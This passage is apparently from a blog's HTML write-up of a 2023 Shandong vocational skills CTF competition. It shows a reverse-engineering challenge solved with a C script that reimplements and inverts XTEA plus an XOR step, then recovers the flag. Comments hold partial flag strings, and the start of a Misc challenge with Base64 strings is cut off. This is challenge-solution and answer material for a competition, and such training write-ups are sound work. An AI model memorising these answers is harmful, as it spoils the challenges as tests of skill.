src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps11.jpg" alt="img"> </p><h2 id="Hardre-反调试-x2F-xtea-x2F-Base64"><a href="#Hardre-反调试-x2F-xtea-x2F-Base64" class="headerlink" title="Hardre - 反调试/xtea/Base64"></a>Hardre - 反调试/xtea/Base64</h2><p>反调试、Xtea、Base64、异或</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps12.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps13.jpg" alt="img"> </p><p>写出解密脚本，看了半天了</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps14.jpg" alt="img"> </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cstdlib&gt;</span></span><br><span class="line"><span class="comment">#include &lt;ctime&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cstring&gt;</span></span><br><span class="line"><span class="comment">#include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include "test.h"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void encipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], <span class="built_in">int</span> const key[<span class="number">4</span>]) {</span><br><span class="line">    unsigned <span class="built_in">int</span> i;</span><br><span class="line">    uint32_t v1 = v[<span class="number">0</span>], v2 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) {</span><br><span class="line">        v1 += (*(_DWORD*)(key + 4LL * (<span class="built_in">sum</span> &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v2 + ((v2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2)));</span><br><span class="line">        <span class="built_in">sum</span> -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v2 += (*(_DWORD*)(key + 4LL * ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">    }</span><br><span class="line">    v[<span class="number">0</span>] = v1; v[<span class="number">1</span>] = v2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//void decipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>]) {</span><br><span class="line">//    unsigned <span class="built_in">int</span> i;</span><br><span class="line">//    uint32_t v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = (<span class="number">0x61C88647</span>), <span class="built_in">sum</span> = (-delta) * num_rounds;</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) {</span><br><span class="line">//        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">//        <span class="built_in">sum</span> += delta;</span><br><span class="line">//        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>]);</span><br><span class="line">//    }</span><br><span class="line">//    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">//}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__int64 __fastcall mainfunc1(unsigned <span class="built_in">int</span>* a1, <span class="built_in">int</span>* key)</span><br><span class="line">{</span><br><span class="line">    unsigned <span class="built_in">int</span> v2; // eax</span><br><span class="line">    __int64 result; // rax</span><br><span class="line">    <span class="built_in">int</span> v4; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">    unsigned __int64 v5; // [rsp+18h] [rbp-38h]</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">sum</span>; // [rsp+24h] [rbp-2Ch]</span><br><span class="line">    unsigned <span class="built_in">int</span> v2_1; // [rsp+38h] [rbp-18h]</span><br><span class="line">    unsigned <span class="built_in">int</span> v1; // [rsp+3Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v1 = *a1;</span><br><span class="line">    v2_1 = a1[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">    v5 = 0LL;</span><br><span class="line">    v4 = <span class="number">0x40B7FFD7</span>;</span><br><span class="line">    <span class="keyword">while</span> (v4 != -<span class="number">71590414</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (v4 == <span class="number">1085800407</span>)</span><br><span class="line">        {</span><br><span class="line">            v2 = <span class="number">0xFBBB9DF2</span>;</span><br><span class="line">            <span class="keyword">if</span> (v5 &lt; <span class="number">0x20</span>)</span><br><span class="line">                v2 = <span class="number">1290115411</span>;</span><br><span class="line">            v4 = v2;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v4 == <span class="number">1262602186</span>)</span><br><span class="line">        {</span><br><span class="line">            ++v5;</span><br><span class="line">            v4 = <span class="number">1085800407</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            v1 += (key[<span class="built_in">sum</span> &amp; <span class="number">3</span>] + <span class="built_in">sum</span>) ^ (v2_1 + ((v2_1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2_1)));</span><br><span class="line">            <span class="built_in">sum</span> -= <span class="number">0x61C88647</span>;</span><br><span class="line">            v2_1 += (key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">            v4 = <span class="number">0x4B41C7CA</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *a1 = v1;</span><br><span class="line">    result = v2_1;</span><br><span class="line">    a1[<span class="number">1</span>] = v2_1;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__int64 __fastcall mainfunc2(unsigned <span class="built_in">int</span>* a1, <span class="built_in">int</span>* key)</span><br><span class="line">{</span><br><span class="line">    unsigned <span class="built_in">int</span> v2; // eax</span><br><span class="line">    __int64 result; // rax</span><br><span class="line">    <span class="built_in">int</span> v4; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">    unsigned __int64 v5; // [rsp+18h] [rbp-38h]</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">sum</span>; // [rsp+24h] [rbp-2Ch]</span><br><span class="line">    unsigned <span class="built_in">int</span> v2_1; // [rsp+38h] [rbp-18h]</span><br><span class="line">    unsigned <span class="built_in">int</span> v1; // [rsp+3Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v1 = *a1;</span><br><span class="line">    v2_1 = a1[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">    v5 = 0LL;</span><br><span class="line">    v4 = <span class="number">0x40B7FFD7</span>;</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0x0C6EF3720</span>;</span><br><span class="line">    <span class="keyword">while</span> (v4 != -<span class="number">71590414</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (v4 == <span class="number">1085800407</span>)</span><br><span class="line">        {</span><br><span class="line">            v2 = <span class="number">0xFBBB9DF2</span>;</span><br><span class="line">            <span class="keyword">if</span> (v5 &lt; <span class="number">0x20</span>)</span><br><span class="line">                v2 = <span class="number">1290115411</span>;</span><br><span class="line">            v4 = v2;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v4 == <span class="number">1262602186</span>)</span><br><span class="line">        {</span><br><span class="line">            ++v5;</span><br><span class="line">            v4 = <span class="number">1085800407</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            v2_1 -= (key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">            <span class="built_in">sum</span> += <span class="number">0x61C88647</span>;</span><br><span class="line">            v1 -= (key[<span class="built_in">sum</span> &amp; <span class="number">3</span>] + <span class="built_in">sum</span>) ^ (v2_1 + ((v2_1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2_1)));</span><br><span class="line">            v4 = <span class="number">0x4B41C7CA</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *a1 = v1;</span><br><span class="line">    result = v2_1;</span><br><span class="line">    a1[<span class="number">1</span>] = v2_1;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">__int64 __fastcall decrpyto(unsigned <span class="built_in">int</span>* a1, <span class="built_in">int</span>* a2)</span><br><span class="line">{</span><br><span class="line">    <span class="built_in">int</span> v2; // eax</span><br><span class="line">    __int64 result; // rax</span><br><span class="line">    <span class="built_in">int</span> v4; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">    unsigned __int64 v5; // [rsp+18h] [rbp-38h]</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">sum</span>; // [rsp+24h] [rbp-2Ch]</span><br><span class="line">    unsigned <span class="built_in">int</span> v7; // [rsp+38h] [rbp-18h]</span><br><span class="line">    unsigned <span class="built_in">int</span> v8; // [rsp+3Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v8 = *a1;</span><br><span class="line">    v7 = a1[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    v5 = 0LL;</span><br><span class="line">    v4 = <span class="number">0x56300D0D</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">while</span> (v4 == -<span class="number">123420904</span>)</span><br><span class="line">        {</span><br><span class="line">            ++v5;</span><br><span class="line">            v4 = <span class="number">1445989645</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (v4 == <span class="number">431583179</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (v4 == <span class="number">719272850</span>)</span><br><span class="line">        {</span><br><span class="line">            v7 -= (a2[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + <span class="built_in">sum</span>) ^ (v8 + ((v8 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v8)));</span><br><span class="line">            <span class="built_in">sum</span> += <span class="number">0x61C88647</span>;</span><br><span class="line">            v8 -= (a2[<span class="built_in">sum</span> &amp; <span class="number">3</span>] + <span class="built_in">sum</span>) ^ (v7 + ((v7 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v7)));</span><br><span class="line">            v4 = -<span class="number">123420904</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            v2 = <span class="number">431583179</span>;</span><br><span class="line">            <span class="keyword">if</span> (v5 &lt; <span class="number">0x20</span>)</span><br><span class="line">                v2 = <span class="number">719272850</span>;</span><br><span class="line">            v4 = v2;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *a1 = v8;</span><br><span class="line">    result = v7;</span><br><span class="line">    a1[<span class="number">1</span>] = v7;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">{</span><br><span class="line">    char crtp[] = { <span class="number">0x8a</span>,<span class="number">0xad</span>,<span class="number">0xe0</span>,<span class="number">0x0f</span>,<span class="number">0x07</span>,<span class="number">0x17</span>,<span class="number">0xb2</span>,<span class="number">0x65</span>,<span class="number">0xcb</span>,<span class="number">0x32</span>,<span class="number">0x50</span>,<span class="number">0x18</span>,<span class="number">0x40</span>,<span class="number">0x92</span>,<span class="number">0xd0</span>,<span class="number">0xfd</span>,<span class="number">0x85</span>,<span class="number">0x58</span>,<span class="number">0xc3</span>,<span class="number">0x5f</span>,<span class="number">0x82</span>,<span class="number">0xbe</span>,<span class="number">0xa3</span>,<span class="number">0xdf</span>,<span class="number">0xe0</span>,<span class="number">0x1c</span>,<span class="number">0x89</span>,<span class="number">0x47</span>,<span class="number">0x5a</span>,<span class="number">0xcc</span>,<span class="number">0xbf</span>,<span class="number">0x53</span>,<span class="number">0xb9</span>,<span class="number">0xb6</span>,<span class="number">0xbc</span>,<span class="number">0xe5</span>,<span class="number">0xc1</span>,<span class="number">0x0a</span>,<span class="number">0x2a</span>,<span class="number">0x0f</span> };</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        printf(<span class="string">"0x%x,"</span>,((crtp[i]^<span class="number">0x32</span>)-i)&amp;<span class="number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">    printf(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">int</span> data2[<span class="number">4</span>] = {</span><br><span class="line">         <span class="number">0x12AB</span>, <span class="number">0x5646</span>, <span class="number">0x78AC</span>,<span class="number">0x322B</span></span><br><span class="line">    };</span><br><span class="line">     <span class="built_in">int</span> data[<span class="number">4</span>] = {</span><br><span class="line">    <span class="number">0x12AB</span>, <span class="number">0x7654</span>, <span class="number">0x78AC</span>,<span class="number">0x2B32</span></span><br><span class="line">    };</span><br><span class="line">     unsigned <span class="built_in">int</span> v[<span class="number">2</span>] = {</span><br><span class="line">    <span class="number">0x4060002</span>,<span class="number">0xC0E080A</span></span><br><span class="line">    };</span><br><span class="line">    //v1 += (*(_DWORD*)(key + 4LL * (<span class="built_in">sum</span> &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v2 + ((v2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2)));</span><br><span class="line">    //<span class="built_in">sum</span> -= <span class="number">0x61C88647</span>;</span><br><span class="line">    //v2 += (*(_DWORD*)(key + 4LL * ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">    // </span><br><span class="line">    // </span><br><span class="line">    // v2 -= (*(_DWORD*)(key + 4LL * ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">    // <span class="built_in">sum</span> += <span class="number">0x61C88647</span>;</span><br><span class="line">    // v1 -= (*(_DWORD*)(key + 4LL * (<span class="built_in">sum</span> &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v2 + ((v2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2)));</span><br><span class="line">    // </span><br><span class="line">    //<span class="built_in">round</span> = <span class="number">0x20</span></span><br><span class="line">     //第一层解密之后的：</span><br><span class="line">     char myflag[] = { <span class="number">0xb8</span>,<span class="number">0x9e</span>,<span class="number">0xd0</span>,<span class="number">0x3a</span>,<span class="number">0x31</span>,<span class="number">0x20</span>,<span class="number">0x7a</span>,<span class="number">0x50</span>,<span class="number">0xf1</span>,<span class="number">0xf7</span>,<span class="number">0x58</span>,<span class="number">0x1f</span>,<span class="number">0x66</span>,<span class="number">0x93</span>,<span class="number">0xd4</span>,<span class="number">0xc0</span>,<span class="number">0xa7</span>,<span class="number">0x59</span>,<span class="number">0xdf</span>,<span class="number">0x5a</span>,<span class="number">0x9c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xd6</span>,<span class="number">0xba</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,<span class="number">0x5a</span>,<span class="number">0x4c</span>,<span class="number">0xe1</span>,<span class="number">0x6f</span>,<span class="number">0x42</span>,<span class="number">0x6b</span>,<span class="number">0x63</span>,<span class="number">0x6c</span>,<span class="number">0xb4</span>,<span class="number">0xcf</span>,<span class="number">0x13</span>,<span class="number">0xf2</span>,<span class="number">0x16</span> };</span><br><span class="line">     <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">     {</span><br><span class="line">          <span class="built_in">int</span> tmp = *(unsigned <span class="built_in">int</span>*)(myflag+i*<span class="number">4</span>);</span><br><span class="line">         printf(<span class="string">"0x%x,"</span>, tmp);</span><br><span class="line">     }</span><br><span class="line">     //<span class="number">0x3ad09eb8</span>,<span class="number">0x507a2031</span>,<span class="number">0x1f58f7f1</span>,<span class="number">0xc0d49366</span>,<span class="number">0x5adf59a7</span>,<span class="number">0xd67b779c</span>,<span class="number">0x5aa115ba</span>,<span class="number">0x426fe14c</span>,<span class="number">0xb46c636b</span>,<span class="number">0x16f213cf</span></span><br><span class="line">     unsigned <span class="built_in">int</span> myflags[] = { <span class="number">0x3ad09eb8</span>,<span class="number">0x507a2031</span>,<span class="number">0x1f58f7f1</span>,<span class="number">0xc0d49366</span>,<span class="number">0x5adf59a7</span>,<span class="number">0xd67b779c</span>,<span class="number">0x5aa115ba</span>,<span class="number">0x426fe14c</span>,<span class="number">0xb46c636b</span>,<span class="number">0x16f213cf</span> };</span><br><span class="line"> //<span class="number">0x8a</span>,<span class="number">0xad</span>,<span class="number">0xe0</span>,<span class="number">0x0f</span>,<span class="number">0x07</span>,<span class="number">0x17</span>,<span class="number">0xb2</span>,<span class="number">0x65</span>,<span class="number">0xcb</span>,<span class="number">0x32</span>,<span class="number">0x50</span>,<span class="number">0x18</span>,<span class="number">0x40</span>,<span class="number">0x92</span>,<span class="number">0xd0</span>,<span class="number">0xfd</span>,<span class="number">0x85</span>,<span class="number">0x58</span>,<span class="number">0xc3</span>,<span class="number">0x5f</span>,<span class="number">0x82</span>,<span class="number">0xbe</span>,<span class="number">0xa3</span>,<span class="number">0xdf</span>,<span class="number">0xe0</span>,<span class="number">0x1c</span>,<span class="number">0x89</span>,<span class="number">0x47</span>,<span class="number">0x5a</span>,<span class="number">0xcc</span>,<span class="number">0xbf</span>,<span class="number">0x53</span>,<span class="number">0xb9</span>,<span class="number">0xb6</span>,<span class="number">0xbc</span>,<span class="number">0xe5</span>,<span class="number">0xc1</span>,<span class="number">0x0a</span>,<span class="number">0x2a</span>,<span class="number">0x0f</span></span><br><span class="line">     </span><br><span class="line">     /*    mainfunc1(v, data);</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        printf(<span class="string">"0x%x "</span>, v[i]);</span><br><span class="line">    }*/</span><br><span class="line"> /*    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">     {</span><br><span class="line">         mainfunc2((unsigned <span class="built_in">int</span>*)myflags[i*<span class="number">2</span>], data);</span><br><span class="line">     }*/</span><br><span class="line">    //flag{1bd</span><br><span class="line">     //n=:&lt;k?n9</span><br><span class="line">     //CAAuAtqF</span><br><span class="line">     //|yN}L}MI</span><br><span class="line">     //flag{1bdn=:&lt;k?n9CAAuAtqF|yN}</span><br><span class="line">     unsigned <span class="built_in">int</span> myflags1[] = { <span class="number">0x3ad09eb8</span>,<span class="number">0x507a2031</span> };</span><br><span class="line">     mainfunc2(myflags, data);</span><br><span class="line">     mainfunc2((unsigned <span class="built_in">int</span>*)(myflags+<span class="number">2</span>), data);</span><br><span class="line">     mainfunc2((unsigned <span class="built_in">int</span>*)(myflags + <span class="number">4</span>), data);</span><br><span class="line">     mainfunc2((unsigned <span class="built_in">int</span>*)(myflags + <span class="number">6</span>), data);</span><br><span class="line">     mainfunc2((unsigned <span class="built_in">int</span>*)(myflags + <span class="number">8</span>), data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     printf(<span class="string">"\n"</span>);</span><br><span class="line">     //flag{1bd </span><br><span class="line">    unsigned char* my = (unsigned char*)myflags;</span><br><span class="line">        <span class="keyword">for</span> (char i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">        {</span><br><span class="line">           //printf(<span class="string">"%x "</span>, my[i]);</span><br><span class="line">            printf(<span class="string">"%c"</span>, ((my[i] ^ <span class="number">0x32</span>) - i) &amp; <span class="number">0xff</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //[stack] :00007FFD358F3D28 dd <span class="number">2</span>-》0BD267223h</span><br><span class="line">        //[stack]:00007FFD358F3D2C dd <span class="number">1</span>-》0D4923EF4h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="时间不多了"><a href="#时间不多了" class="headerlink" title="时间不多了"></a>时间不多了</h2><p>批量CQR + 键盘密码?</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/image-20231114134145581.png" alt="image-20231114134145581"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==</span><br><span class="line">NiAxMyAyMCAyNyAyOA==</span><br><span class="line">MiAxNSAyMiAxNyAyNCAxNg==</span><br><span class="line">NiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=</span><br><span class="line">MiAzIDkgMTUgMjMgMzAgMzE=</span><br><span class="line">NSAxMyAyMCAyNyAxNCAyMQ==</span><br><span class="line">NiAxOSAyNiAyMSAyOCAyMA==</span><br><span 